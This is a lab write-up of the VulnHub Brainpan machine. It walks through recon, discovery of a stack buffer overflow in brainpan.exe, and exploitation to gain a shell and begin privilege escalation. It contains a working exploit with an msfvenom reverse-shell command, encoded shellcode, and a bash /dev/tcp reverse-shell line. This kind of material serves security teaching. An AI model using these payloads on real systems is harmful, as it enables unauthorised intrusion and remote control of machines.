# Brainpan

* ### Setup

  Download the virtual machine <a href="https://www.vulnhub.com/entry/brainpan-1,51/">here</a> and import it in either VirtualBox or        VMWare.
  * **Addresses** - This will be important to understand the writeup.
    * My Windows machine: **192.168.2.11**
    * My Kali machine: **10.0.2.15**
    * Brainpan machine: **10.0.2.8**
  
### Information Gathering
---

First of all, we run **nmap** with `nmap -sC -sV -p- -oA brainpan.nmap 10.0.2.8` (replace your target IP)  

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/first.png">

We can see that there are only two ports open and two services running on the machine, one at **9999** and the other at **10000**.

Navigating to **10.0.2.8:9999** with firefox returns   

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/second.png">

The service running there seems to be expecting a password but it doesn't seem to work over http.

Let's try talking to it with **nc** with `nc 10.0.2.8 9999`

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/six.png">


We can now input a password but we don't know it **_yet_**.

Navigating to **10.0.2.8:10000** returns  
<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/third.png">  

Just a page with an image.

At this point we can put **gobuster** (directory fuzzing tool) running in the background with   
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.8:10000/ -t 5 --timeout 50s`

The high timeout was selected because the HTTP Server running is just a python module and can't handle that much traffic at once. Choosing a lower one returns a lot of errors.

After a while, gobuster returns an interesting directory **_/bin_**.

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/fourth.png">


Navigating there we see only one file called **brainpan.exe**

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/five.png">


Let's download it.

Running it locally with **wine** reveals it is some kind of server expecting for connections at port 9999, just like the service on the box.

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/seven.png">


The program now listens on localhost, so let's connect with **nc** at our own machine at port 9999.

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/eight.png">


It is clear now that **brainpan.exe** is a copy of the program listening at **9999** at the **remote** box.

Although it is a Windows executable, we can still run `strings` on it.

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/nine.png">


This looks interesting.

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/ten.png">


This seems to be the correct password but nothing happens when we type it, even at the remote service, so it's pretty useless.

## Vulnerability Analysis
---

We can move **brainpan.exe** to our windows machine for easier analysis.

Start up **Immunity Debugger** and run the program.

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/eleven.png">

We will try to crash the application.

Open an ubuntu terminal from the installed ubuntu subsystem on windows, and create a python script like this

```python

print b"A" * 1000
```

Now echo the output to a file `python test.py > crash` , and run `nc 192.168.2.11 9999 <crash` to give the contents of **crash** as input for the password to the program. After running, take a look at **immunity**.

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/twelve.png">

We see that not only we crashed the program but we also **overwrote** the instruction pointer **eip**. 
We have a **Buffer Overflow!**

## Exploitation
---

Through a little trial and error, we find that we need to print **524** bytes to start overwriting **eip**.

Typing `!mona modules` in immunity's command line, we see that all protections on **brainpan.exe** are turned off, so this is going to be pretty easy. (Install mona <a href="https://github.com/corelan/mona">here</a>.)  

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/thirteen.png">


Now that we control **eip**, what should we set it to? Where will our shellcode be placed?
Please read: https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/

Right after overwriting **eip** we start overwriting the next values on the stack beginning at the point where the **stack pointer** will return to, after the function call.

* So we have to find a way to jump to **esp**.
Searching in all modules in Immunity for the command `jmp esp` results in 

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/fourteen.png">


We can only use the `jmp esp` located in **brainpan** itself, because it is the **only** module with **ASLR** disabled.
This means that this particular instruction will always be at that particular address.

Let's point **eip** to that address.

```python
from struct import pack
padding = b"A" * 524 # To reach EIP
padding += pack("<L",0x311712F3)
padding += "\x90" * 10 # NOPs
padding += "\xcc" # Add a breakpoint
print padding
```
Now do `python test.py > test` and restart the program giving as input `nc 192.168.2.11 9999 <test`

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/fifteen.png">


We can see we are successful, the program executed our instruction perfectly and stopped right at the`\xcc` we provided , which is a way to halt execution. (This is how debuggers work and are able to stop execution of a program).

Now let's create a **_real_** payload with **msfvenom**. We can create the appropriate shellcode with
`msfvenom -p windows/shell/reverse_tcp LHOST=10.0.2.15 -e x86/shikata_ga_nai -b '\x00' -f python --smallest -v shellcode`.

Although the target is Linux-based, it probably runs brainpan with **wine** and that is why we select windows in **msfvenom**, so we can execute **windows cmd** in wine at the remote host.

The above command selects port **4444** as the listen port automatically and outputs the following shellcode in a format that is easy to implement in **python** and **clear** of **null bytes '\x00'**.


```python

shellcode += b"\xdb\xd3\xd9\x74\x24\xf4\xbb\xad\x99\x66\x76"
shellcode += b"\x5e\x31\xc9\xb1\x47\x83\xc6\x04\x31\x5e\x16"
shellcode += b"\x03\x5e\x16\xe2\x58\x65\x8e\xf4\xa2\x96\x4f"
shellcode += b"\x99\x2b\x73\x7e\x99\x4f\xf7\xd1\x29\x04\x55"
shellcode += b"\xde\xc2\x48\x4e\x55\xa6\x44\x61\xde\x0d\xb2"
shellcode += b"\x4c\xdf\x3e\x86\xcf\x63\x3d\xda\x2f\x5d\x8e"
shellcode += b"\x2f\x31\x9a\xf3\xdd\x63\x73\x7f\x73\x94\xf0"
shellcode += b"\x35\x4f\x1f\x4a\xdb\xd7\xfc\x1b\xda\xf6\x52"
shellcode += b"\x17\x85\xd8\x55\xf4\xbd\x51\x4e\x19\xfb\x28"
shellcode += b"\xe5\xe9\x77\xab\x2f\x20\x77\x07\x0e\x8c\x8a"
shellcode += b"\x56\x56\x2b\x75\x2d\xae\x4f\x08\x35\x75\x2d"
shellcode += b"\xd6\xb0\x6e\x95\x9d\x62\x4b\x27\x71\xf4\x18"
shellcode += b"\x2b\x3e\x73\x46\x28\xc1\x50\xfc\x54\x4a\x57"
shellcode += b"\xd3\xdc\x08\x73\xf7\x85\xcb\x1a\xae\x63\xbd"
shellcode += b"\x23\xb0\xcb\x62\x81\xba\xe6\x77\xb8\xe0\x6e"                                                                                                         
shellcode += b"\xbb\xf0\x1a\x6f\xd3\x83\x69\x5d\x7c\x3f\xe6"
shellcode += b"\xed\xf5\x99\xf1\x64\x11\x1a\x2d\xce\x72\xe5"
shellcode += b"\xce\x2f\x5a\x21\x9a\x7f\xf4\x80\xa3\xeb\x04"
shellcode += b"\x2d\x76\x81\x0e\xb9\x73\x56\x0d\x36\xec\x54"
shellcode += b"\x11\x59\xb0\xd1\xf7\x09\x18\xb2\xa7\xe9\xc8"
shellcode += b"\x72\x18\x81\x02\x7d\x47\xb1\x2c\x57\xe0\x5b"
shellcode += b"\xc3\x0e\x58\xf3\x7a\x0b\x12\x62\x82\x81\x5e"
shellcode += b"\xa4\x08\x26\x9e\x6a\xf9\x43\x8c\x1a\x09\x1e"
shellcode += b"\xee\x8c\x16\xb4\x85\x30\x83\x33\x0c\x67\x3b"
shellcode += b"\x3e\x69\x4f\xe4\xc1\x5c\xc4\x2d\x54\x1f\xb2"
shellcode += b"\x51\xb8\x9f\x42\x04\xd2\x9f\x2a\xf0\x86\xf3"
shellcode += b"\x4f\xff\x12\x60\xdc\x6a\x9d\xd1\xb1\x3d\xf5"
shellcode += b"\xdf\xec\x0a\x5a\x1f\xdb\x8a\xa6\xf6\x25\xf9"
shellcode += b"\xc6\xca"
```

Create the final python script with the above shellcode. You can find it in this repo too.

Let's test it locally first. Run brainpan with wine again and prepair like this.

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/sixteen.png">


Now run the command at the bottom left aaaand we have a **shell** !

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/seventeen.png">


Doing the same but for the brainpan box gives us a shell with the user **puck**

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Brainpan/images/eighteen.png">


## Privilege escalation 
---

As we have already noticed the remote host is actually a Linux box running **cmd** through wine. Running `/bin/bash` in the given terminal and typing bash commands work sometimes but sometimes it doesn't. Wine seems to switch between Linux and Windows mode. This isn't practical so let's try to send a linux terminal back to us on port **1337** with `bash -i >& /dev/tcp/10.0.2.15/1337 0>&1`.

Typing this command in the given shell and in parallel listenining at port **1337** in our box returns a proper linux shell at us. ( I tried 2 or 3 times to get this to work).

Now that we have a stable **BASH** shell, run `sudo -l` to see what can be run as **root** from the user **puck**. If you run this command you will see that you can run ` /home/anansi/bin/anansi_util` as **root** with **no** password needed.


https://superuser.com/questions/521399/how-do-i-execute-a-linux-command-whilst-using-the-less-command-or-within-the-man

